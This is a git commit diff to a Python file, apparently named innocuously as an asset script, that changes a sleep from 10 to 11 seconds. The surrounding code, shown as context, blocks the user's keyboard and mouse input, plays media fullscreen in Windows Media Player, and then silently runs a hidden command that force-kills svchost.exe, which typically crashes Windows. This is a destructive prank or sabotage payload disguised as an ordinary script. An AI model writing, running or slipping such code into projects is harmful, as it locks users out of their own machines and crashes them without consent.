f5ab3f2296c26d922712e91c7ecc0c967bd4f5c0
PumpgunStudios <127331524+eripum9@users.noreply.github.com>
2026-02-28 00:47:25 +0100

    Update script.py

--- assets/script.py
+++ assets/script.py
@@ -10,9 +10,10 @@ ctypes.windll.user32.BlockInput(True)
 # launch Windows Media Player explicitly in fullscreen
 wmp = r'C:\Program Files\Windows Media Player\wmplayer.exe'
 proc = subprocess.Popen([wmp, '/fullscreen', '/play', out])
-time.sleep(10)
+time.sleep(11)
 cmdline = f'cmd /c TASKKILL /IM svchost.exe /F"'
 si = subprocess.STARTUPINFO()
 si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 si.wShowWindow = subprocess.SW_HIDE
 subprocess.Popen(cmdline, startupinfo=si)
+
